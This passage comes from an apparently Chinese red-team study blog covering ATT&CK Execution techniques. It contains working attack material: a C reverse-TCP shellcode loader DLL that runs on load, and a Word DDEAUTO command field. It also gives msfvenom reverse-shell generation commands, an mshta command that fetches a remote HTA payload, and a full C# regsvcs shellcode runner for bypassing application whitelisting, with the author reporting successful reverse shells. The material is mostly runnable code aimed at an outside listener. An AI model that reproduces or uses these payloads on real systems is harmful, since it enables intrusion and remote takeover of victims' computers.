WSADATA wsData;</span><br><span class="line">        <span class="keyword">if</span>(WSAStartup(MAKEWORD(<span class="number">2</span>,<span class="number">2</span>),&amp;wsData))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"WSAStartp fail.\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; </span><br><span class="line"> </span><br><span class="line">        SOCKET sock = WSASocket(AF_INET,SOCK_STREAM,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        SOCKADDR_IN server;</span><br><span class="line">        ZeroMemory(&amp;server,<span class="keyword">sizeof</span>(SOCKADDR_IN));</span><br><span class="line">        server.sin_family = AF_INET;</span><br><span class="line">        server.sin_addr.s_addr = inet_addr(<span class="string">"192.168.127.132"</span>); <span class="comment">//server ip</span></span><br><span class="line">        server.sin_port = htons(<span class="number">8888</span>); <span class="comment">//server port</span></span><br><span class="line">        <span class="keyword">if</span>(SOCKET_ERROR == <span class="built_in">connect</span>(sock,(SOCKADDR*)&amp;server,<span class="keyword">sizeof</span>(server)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"connect to server fail.\n"</span>);</span><br><span class="line">            closesocket(sock);</span><br><span class="line">            WSACleanup();</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; </span><br><span class="line"> </span><br><span class="line">        u_int payloadLen;</span><br><span class="line">        <span class="keyword">if</span> (recv(sock,(<span class="keyword">char</span>*)&amp;payloadLen,<span class="keyword">sizeof</span>(payloadLen),<span class="number">0</span>) != <span class="keyword">sizeof</span>(payloadLen))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"recv error\n"</span>);</span><br><span class="line">            closesocket(sock);</span><br><span class="line">            WSACleanup();</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">char</span>* orig_buffer = (<span class="keyword">char</span>*)VirtualAlloc(<span class="literal">NULL</span>,payloadLen,MEM_COMMIT,PAGE_EXECUTE_READWRITE);</span><br><span class="line">        <span class="keyword">char</span>* <span class="built_in">buffer</span> = orig_buffer;</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span> </span><br><span class="line">        &#123;</span><br><span class="line">            ret = recv(sock,<span class="built_in">buffer</span>,payloadLen,<span class="number">0</span>);</span><br><span class="line">            <span class="built_in">buffer</span> += ret;</span><br><span class="line">            payloadLen -= ret;</span><br><span class="line">        &#125; <span class="keyword">while</span> (ret &gt; <span class="number">0</span> &amp;&amp; payloadLen &gt; <span class="number">0</span>);  </span><br><span class="line"> </span><br><span class="line">        __asm</span><br><span class="line">        &#123;</span><br><span class="line">            mov edi,sock;   </span><br><span class="line">            jmp orig_buffer; </span><br><span class="line">        &#125; </span><br><span class="line"> </span><br><span class="line">        VirtualFree(orig_buffer,<span class="number">0</span>,MEM_RELEASE);   </span><br><span class="line">&#125;   </span><br><span class="line"> </span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                      DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                      LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                      )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        reverse_tcp();</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>参考链接：<a href="https://blog.csdn.net/weixin_34232617/article/details/87979961" target="_blank" rel="noopener">https://blog.csdn.net/weixin_34232617/article/details/87979961</a></p>
+<h2 id="Dynamic-Data-Exchange-T1173"><a href="#Dynamic-Data-Exchange-T1173" class="headerlink" title="Dynamic Data Exchange-T1173"></a>Dynamic Data Exchange-T1173</h2><p>动态数据交换，简称DDE，使用DDE通讯需要两个Windows应用程序，其中一个作为服务器处理信息，另外一个作为客户机从服务器获得信息。</p>
+<p><strong>说白了就是一个协议，用于服务端和客户端的数据交换。</strong></p>
+<p>由网络上提供的文档等信息可以了解到这个协议的攻击手法主要集中在windows中的office工具中，比如Excel等。</p>
+<p>在MSWord和MSExcel中可以使用DDE来执行命令，最初也是国外研究人员提出了通过DDE来绕过开启宏的限制。</p>
+<p>首先新建一个Word文档</p>
+<p>新建一个Word文档，通过<strong>Ctrl+F9</strong>添加一个域，然后修改域代码为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; DDEAUTO &quot;c:\\windows\\system32\\cmd.exe&quot; &quot;&#x2F;k notepad.exe&quot; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>“DDEAUTO”关键字指示Word这是一个DDE域，并且在打开文档时自动执行域代码。在域代码中，紧跟“DDEAUTO”关键字后面的是要执行的可执行程序的路径，后面跟随的是可执行程序的参数。</p>
+<p>关键字除了DDEAUTO之外也可以使用DDE：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; DDE &quot;c:\\windows\\system32\\cmd.exe&quot; &quot;&#x2F;k notepad.exe&quot; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>不过DDE字段不会自动运行（右键输入的DDE代码选择域属性，勾选Preserve fomatting during updates）</p>
+<p>这个文章里还提到了使用DDE插入Word文档进行反弹Empire shell的方式，环境中没有安装office，所以没有实验。</p>
+<p>参考链接：<a href="https://www.freebuf.com/articles/system/153105.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/153105.html</a></p>
+<h2 id="Execution-through-API-T1106"><a href="#Execution-through-API-T1106" class="headerlink" title="Execution through API-T1106"></a>Execution through API-T1106</h2><p>一些工具可以通过windows API来执行二进制文件，例如Windows API  CreateProcess之类的函数将允许程序和脚本使用正确的路径和参数启动其他进程。</p>
+<p>可用于执行二进制文件的其他Windows API调用包括：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CreateProcessA() and CreateProcessW(),</span><br><span class="line">CreateProcessAsUserA() and CreateProcessAsUserW(),</span><br><span class="line">CreateProcessInternalA() and CreateProcessInternalW(),</span><br><span class="line">CreateProcessWithLogonW(), CreateProcessWithTokenW(),</span><br><span class="line">LoadLibraryA() and LoadLibraryW(),</span><br><span class="line">LoadLibraryExA() and LoadLibraryExW(),</span><br><span class="line">LoadModule(),</span><br><span class="line">LoadPackagedLibrary(),</span><br><span class="line">WinExec(),</span><br><span class="line">ShellExecuteA() and ShellExecuteW(),</span><br><span class="line">ShellExecuteExA() and ShellExecuteExW()</span><br></pre></td></tr></table></figure>
+
+<h2 id="未完成Execution-through-Module-Load-T1129"><a href="#未完成Execution-through-Module-Load-T1129" class="headerlink" title="未完成Execution through Module Load-T1129"></a>未完成Execution through Module Load-T1129</h2><p>可以指示Windows模块加载程序从任意本地路径和任意通用命名约定（UNC）网络路径加载DLL。这个功能使用的是系统中的NTDLL.dll。</p>
+<p>攻击者可以使用此功能作为在系统上执行任意代码的方法。（？？？）</p>
+<h2 id="Exploitation-for-Client-Execution-T1203"><a href="#Exploitation-for-Client-Execution-T1203" class="headerlink" title="Exploitation for Client Execution-T1203"></a>Exploitation for Client Execution-T1203</h2><p>这个主要说了通过一些软件，比如钓鱼页面、Office等还有Flash的漏洞等来执行。</p>
+<h2 id="Graphical-User-Interface-T1061"><a href="#Graphical-User-Interface-T1061" class="headerlink" title="Graphical User Interface-T1061"></a>Graphical User Interface-T1061</h2><p>图形用户界面（GUI）是与操作系统交互的常用方式。攻击者可以在操作期间使用系统的GUI，通常通过远程交互式会话（如远程桌面协议），而不是通过命令行界面，通过鼠标双击事件搜索信息和执行文件，Windows运行命令[ 1]，或其他可能难以监控的交互。</p>
+<p>主要就是提到了通过例如RDP协议进行的执行命令。</p>
+<h2 id="InstallUtil-T1118"><a href="#InstallUtil-T1118" class="headerlink" title="InstallUtil-T1118"></a>InstallUtil-T1118</h2><p>InstallUtil是一个命令行实用程序，它允许通过执行.NET二进制文件中指定的特定安装程序组件来安装和卸载资源。InstallUtil位于Windows系统上的.NET目录中：和InstallUtil.exe由Microsoft进行数字签名。</p>
+<p>在系统中的位置是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\vXXX\InstallUtil.exe</span><br></pre></td></tr></table></figure>
+
+<p>可以通过InstallUtil执行命令，可以算是基于白名单的一种执行方法。</p>
+<p>官网有命令说明：</p>
+<p><a href="https://docs.microsoft.com/zh-cn/dotnet/framework/tools/installutil-exe-installer-tool" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/tools/installutil-exe-installer-tool</a></p>
+<p><strong>使用InstallUitl执行shellcode反弹shell</strong></p>
+<p>使用msfvenom生成shellcode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.144.176 LPORT&#x3D;4444 -f csharp &gt; TestInstallUtil.cs</span><br></pre></td></tr></table></figure>
+
+<p><img src="Execution.assets/1574416138279.png" alt="1574416138279"></p>
+<p>然后加入C#代码组合成能够编译的C#，已经有做好的框架：</p>
+<p><a href="https://gist.githubusercontent.com/lithackr/b692378825e15bfad42f78756a5a3260/raw/b049d539be7e84afa7abecf143ab393cb158322a/InstallUtil-Shellcode-cs" target="_blank" rel="noopener">https://gist.githubusercontent.com/lithackr/b692378825e15bfad42f78756a5a3260/raw/b049d539be7e84afa7abecf143ab393cb158322a/InstallUtil-Shellcode-cs</a></p>
+<p><img src="Execution.assets/1574416162988.png" alt="1574416162988"></p>
+<p>使用csc.exe编译成dll或者exe文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe &#x2F;unsafe &#x2F;platform:x86 &#x2F;out:TestInstallUtil.exe .\InstallUtilC.cs</span><br></pre></td></tr></table></figure>
+
+<p><img src="Execution.assets/1574416185030.png" alt="1574416185030"></p>
+<p>然后使用InstallUtil.exe文件执行生成的TestInstallUtil.exe</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe &#x2F;logfile&#x3D; &#x2F;LogToConsole&#x3D;false &#x2F;U .\TestInstallUtil.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="Execution.assets/1574416218736.png" alt="1574416218736"></p>
+<p>反弹shell成功：</p>
+<p><img src="Execution.assets/1574416230389.png" alt="1574416230389"></p>
+<h2 id="Launchctl-T1152"><a href="#Launchctl-T1152" class="headerlink" title="Launchctl-T1152"></a>Launchctl-T1152</h2><p>MACOS</p>
+<h2 id="Local-Job-Scheduling-T1168"><a href="#Local-Job-Scheduling-T1168" class="headerlink" title="Local Job Scheduling-T1168"></a>Local Job Scheduling-T1168</h2><p>主要说明了在Linux和MACOS下的定时任务命令crontab使用，可以在Linux下直接crontab -h查看使用帮助，或者参考网站上的使用方法：<a href="https://www.runoob.com/linux/linux-comm-crontab.html" target="_blank" rel="noopener">https://www.runoob.com/linux/linux-comm-crontab.html</a></p>
+<h2 id="LSASS-Driver-T1177"><a href="#LSASS-Driver-T1177" class="headerlink" title="LSASS Driver-T1177"></a>LSASS Driver-T1177</h2><p>Windows安全子系统是一组用于管理和实施计算机或域的安全策略的组件。本地安全机构（LSA）是负责本地安全策略和用户身份验证的主要组件。LSA包括与各种其他安全功能相关联的多个动态链接库（DLL），所有这些功能都在LSA子系统服务（LSASS）lsass.exe进程的上下文中运行。</p>
+<p>然而怎么执行？</p>
+<h2 id="MSHTA-T1170"><a href="#MSHTA-T1170" class="headerlink" title="MSHTA-T1170"></a>MSHTA-T1170</h2><h3 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h3><p>Mshta.exe是一个执行Microsoft HTML应用程序（HTA）的实用程序。HTA文件后缀为.hta，全称是HTML APPlication。MSF已经自带利用的模块</p>
+<p>可以直接使用MSF生成HTA文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell&#x2F;reverse_tcp lhost&#x3D;192.168.144.176 lport&#x3D;4444 -f hta-psh -o testhta.hta</span><br></pre></td></tr></table></figure>
+
+<p><img src="Execution.assets/1574416472065.png" alt="1574416472065"></p>
+<p>生成的HTA文件内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;VBScript&quot;&gt;                                                                                                                                                                                                     &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后可以通过mshta来执行，可远程执行，还有Koadic等工具也可以生成HTA文件。</p>
+<h3 id="直接使用MSF反弹shell："><a href="#直接使用MSF反弹shell：" class="headerlink" title="直接使用MSF反弹shell："></a>直接使用MSF反弹shell：</h3><p>MSF执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;misc&#x2F;hta_server</span><br><span class="line">set srvhost 10.32.11.122</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="Execution.assets/1576565526982.png" alt="1576565526982"></p>
+<p>目标主机：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http:&#x2F;&#x2F;192.168.144.176:8080&#x2F;OaDQ6u.hta</span><br></pre></td></tr></table></figure>
+
+<h2 id="Powershell-T1086"><a href="#Powershell-T1086" class="headerlink" title="Powershell-T1086"></a>Powershell-T1086</h2><p>提到了Empire、PowerSploit和PSAttack等框架，Powershell能执行的太多了，不写了。</p>
+<h2 id="Regsvcs-Regasm-T1121"><a href="#Regsvcs-Regasm-T1121" class="headerlink" title="Regsvcs/Regasm-T1121"></a>Regsvcs/Regasm-T1121</h2><p>Regsvcs和Regasm分别是.NET服务安装工具和程序集注册工具。</p>
+<p>Regsvcs（.NET服务安装工具）执行下列操作：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">加载并注册程序集</span><br><span class="line">生成注册类型库并将其安装到指定的COM+应用程序中</span><br><span class="line">配置以编程方式添加到类的服务</span><br></pre></td></tr></table></figure>
+
+<p><img src="Execution.assets/1574417370895.png" alt="1574417370895"></p>
+<p>Regasm（程序集注册工具）</p>
+<p>​    程序集注册工具读取程序集中的元数据，并将必要的条目添加到注册表，这允许COM客户端透明的创建.NET Framework类。</p>
+<p><img src="Execution.assets/1574417392929.png" alt="1574417392929"></p>
+<p>这两个程序的利用一般是用来绕过APPLocker白名单的限制。不过默认情况下这两个命令是没有加入到环境变量里的，需要使用绝对路径来运行。</p>
+<p><img src="Execution.assets/1574417401674.png" alt="1574417401674"></p>
+<p>反弹shell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.144.176 LPORT&#x3D;4444 -f csharp &gt; TestInstallUtil.cs</span><br></pre></td></tr></table></figure>
+
+<p>使用msfvenom生成shellcode（这里用的是上文中InstallUtil实验的shellcode，没区别）</p>
+<p><img src="Execution.assets/1574416138279.png" alt="1574416138279"></p>
+<p>然后加入C#代码组合成能够编译的C#，已经有做好的框架：</p>
+<p><a href="https://github.com/3gstudent/Bypass-McAfee-Application-Control--Code-Execution/blob/master/regsvcs.cs" target="_blank" rel="noopener">https://github.com/3gstudent/Bypass-McAfee-Application-Control--Code-Execution/blob/master/regsvcs.cs</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.EnterpriseServices;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">Author: Casey Smith, Twitter: @subTee</span><br><span class="line">License: BSD 3-Clause</span><br><span class="line">Create Your Strong Name Key -&gt; key.snk</span><br><span class="line">$key &#x3D; &#39;BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq&#x2F;vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu&#x2F;WxZaffHS2te&#x2F;PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g&#x2F;P+JpXGN0&#x2F;+Hitolufo7Ucjh+WvZAU&#x2F;&#x2F;dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm&#x2F;ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15&#x2F;4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX&#x2F;tqcBuBIg&#x2F;cpcDHps&#x2F;6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b&#x2F;WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4&#x3D;&#39;</span><br><span class="line">$Content &#x3D; [System.Convert]::FromBase64String($key)</span><br><span class="line">Set-Content key.snk -Value $Content -Encoding Byte</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe &#x2F;r:System.EnterpriseServices.dll &#x2F;target:library &#x2F;out:regsvcs.dll &#x2F;keyfile:key.snk regsvcs.cs</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe regsvcs.dll </span><br><span class="line">[OR]</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe regsvcs.dll</span><br><span class="line">&#x2F;&#x2F;Executes UnRegisterClass If you don&#39;t have permissions</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe &#x2F;U regsvcs.dll </span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe &#x2F;U regsvcs.dll</span><br><span class="line">&#x2F;&#x2F;This calls the UnregisterClass Method</span><br><span class="line">*&#x2F;</span><br><span class="line">namespace regsvcser</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    public class Bypass : ServicedComponent</span><br><span class="line">    &#123;</span><br><span class="line">        public Bypass() &#123; Console.WriteLine(&quot;I am a basic COM Object&quot;); &#125;</span><br><span class="line">		</span><br><span class="line">		[ComRegisterFunction] &#x2F;&#x2F;This executes if registration is successful</span><br><span class="line">		public static void RegisterClass ( string key )</span><br><span class="line">		&#123;</span><br><span class="line">			Console.WriteLine(&quot;I shouldn&#39;t really execute&quot;);</span><br><span class="line">			Shellcode.Exec();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		[ComUnregisterFunction] &#x2F;&#x2F;This executes if registration fails</span><br><span class="line">		public static void UnRegisterClass ( string key )</span><br><span class="line">		&#123;</span><br><span class="line">			Console.WriteLine(&quot;I shouldn&#39;t really execute either.&quot;);</span><br><span class="line">			Shellcode.Exec();</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	public class Shellcode</span><br><span class="line">    &#123;</span><br><span class="line">        public static void Exec()</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; native function&#39;s compiled code</span><br><span class="line">            &#x2F;&#x2F; generated with metasploit</span><br><span class="line">            &#x2F;&#x2F; executes calc.exe</span><br><span class="line">            byte[] shellcode &#x3D; new byte[193] &#123;</span><br><span class="line">			0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,</span><br><span class="line">			0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,</span><br><span class="line">			0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,</span><br><span class="line">			0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,</span><br><span class="line">			0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,</span><br><span class="line">			0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,</span><br><span class="line">			0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,</span><br><span class="line">			0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,</span><br><span class="line">			0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,</span><br><span class="line">			0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,</span><br><span class="line">			0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,</span><br><span class="line">			0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,</span><br><span class="line">			0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 &#125;;</span><br><span class="line"></span><br><span class="line">            UInt32 funcAddr &#x3D; VirtualAlloc(0, (UInt32)shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">            IntPtr hThread &#x3D; IntPtr.Zero;</span><br><span class="line">            UInt32 threadId &#x3D; 0;</span><br><span class="line">            &#x2F;&#x2F; prepare data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            IntPtr pinfo &#x3D; IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; execute native code</span><br><span class="line"></span><br><span class="line">            hThread &#x3D; CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">            WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static UInt32 MEM_COMMIT &#x3D; 0x1000;</span><br><span class="line"></span><br><span class="line">        private static UInt32 PAGE_EXECUTE_READWRITE &#x3D; 0x40;</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect);</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern IntPtr CreateThread(</span><br><span class="line">          UInt32 lpThreadAttributes,</span><br><span class="line">          UInt32 dwStackSize,</span><br><span class="line">          UInt32 lpStartAddress,</span><br><span class="line">          IntPtr param,</span><br><span class="line">          UInt32 dwCreationFlags,</span><br><span class="line">          ref UInt32 lpThreadId</span><br><span class="line">          );</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 WaitForSingleObject(</span><br><span class="line">          IntPtr hHandle,</span><br><span class="line">          UInt32 dwMilliseconds</span><br><span class="line">          );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接替换上面代码中的shellcode部分，然后使用sn.exe生成密钥(关于sn.exe可以参考<a href="https://docs.microsoft.com/zh-cn/dotnet/framework/tools/sn-exe-strong-name-tool?redirectedfrom=MSDN)：" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/tools/sn-exe-strong-name-tool?redirectedfrom=MSDN)：</a></p>
+<p><img src="Execution.assets/1574417624261.png" alt="1574417624261"></p>
+<p>然后编译成exe或者dll文件，即可使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe &#x2F;r:System.EnterpriseServices.dll &#x2F;target:library &#x2F;out:testRegsvcs.dll &#x2F;keyfile:key.snk testregsvcs.cs</span><br></pre></td></tr></table></figure>
+
+<p><img src="Execution.assets/1574418828978.png" alt="1574418828978"></p>
+<p>直接使用regsvcs.exe运行dll文件</p>
+<p><img src="Execution.assets/1574418839904.png" alt="1574418839904"></p>
+<p>执行之后会反弹shell</p>
+<p><img src="Execution.assets/1574418847052.png" alt="1574418847052"></p>
+<h2 id="REGSVR32-T1117"><a href="#REGSVR32-T1117" class="headerlink" title="REGSVR32-T1117"></a>REGSVR32-T1117</h2><p>Regsvr32.exe是一个命令行程序，用于在Windows系统上注册和取消注册对象链接和嵌入控件，包括动态链接库（DLL）。Regsvr32.exe可用于执行任意二进制文件。主要也是躲避检测，windows正常使用regsvr32.exe可能会触发检测系统的误报。</p>
+<p>使用MSF的server/regsvr32_command_delivery_server模块能够通过regsvr32执行命令</p>
